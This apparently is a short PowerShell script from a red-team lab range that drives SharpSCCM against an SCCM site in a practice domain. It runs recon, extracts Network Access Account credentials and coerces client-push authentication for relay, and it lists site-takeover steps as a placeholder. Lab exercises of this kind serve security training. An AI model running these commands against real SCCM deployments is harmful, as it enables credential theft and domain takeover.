# CADRE — WT#034-039 SCCM (SharpSCCM) — site CAD on mbr02 (range.local)
. ..\lib\cadre-env.ps1
. ..\lib\common.ps1
print_banner "WT#034-039 - SCCM Attacks"
start_attack "034" "SCCM NAA + recon"
require_tool SharpSCCM.exe

step "Locate the management point / site (recon)"
run_cmd "SharpSCCM.exe get site-info -mp $SCCM_SERVER"

step "WT#034 Extract Network Access Account creds (CRED-1)"
run_cmd "SharpSCCM.exe get naa -mp $SCCM_SERVER -sc $SCCM_SITE"

step "WT#036 Coerce client-push -> relay machine account (CRED-2/ELEVATE-2)"
run_cmd "SharpSCCM.exe invoke client-push -mp $SCCM_SERVER -t <relay-listener>"

step "WT#037-039 With svc_sccm Full Admin: CMPivot / app deploy / site takeover via Console + SQL"
run_cmd "Write-Host '  CMPivot query / deploy app to a device collection / RBAC takeover on mbr02'"

result $LASTEXITCODE "SCCM Attacks completed"
